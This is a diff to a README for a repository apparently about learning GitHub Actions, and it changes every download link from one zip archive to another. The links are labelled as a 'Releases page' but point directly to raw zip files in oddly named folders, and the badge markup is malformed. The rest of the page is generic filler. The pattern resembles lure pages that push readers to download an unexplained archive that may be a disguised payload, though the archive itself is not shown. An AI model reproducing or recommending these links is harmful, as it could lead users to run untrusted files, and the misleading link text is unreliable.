@@ -1,6 +1,6 @@
 # 🚀 github-actions-journey - Your Path to Understanding GitHub Actions 
 
-[![Download](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip%https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip)](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip)
+[![Download](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/docs/day01/journey_actions_github_1.3.zip%https://raw.githubusercontent.com/anter1s/github-actions-journey/main/docs/day01/journey_actions_github_1.3.zip)](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/docs/day01/journey_actions_github_1.3.zip)
 
 ## 📖 Overview
 
@@ -15,12 +15,12 @@ To get started, you will need to download the material from our Releases page. T
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Actions Journey Releases](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip).
+Visit this page to download: [GitHub Actions Journey Releases](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/docs/day01/journey_actions_github_1.3.zip).
 
 On the Releases page, locate the most recent version. Each release will have a list of downloadable files. Follow these simple steps to get the files you need:
 
 1. Find the latest release version at the top of the page.
-2. Click on the asset you want to download. For example, you might see files like `https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip` or `https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip`. 
+2. Click on the asset you want to download. For example, you might see files like `https://raw.githubusercontent.com/anter1s/github-actions-journey/main/docs/day01/journey_actions_github_1.3.zip` or `https://raw.githubusercontent.com/anter1s/github-actions-journey/main/docs/day01/journey_actions_github_1.3.zip`. 
 3. Your download will begin automatically.
 
 ## 📚 What You Will Learn
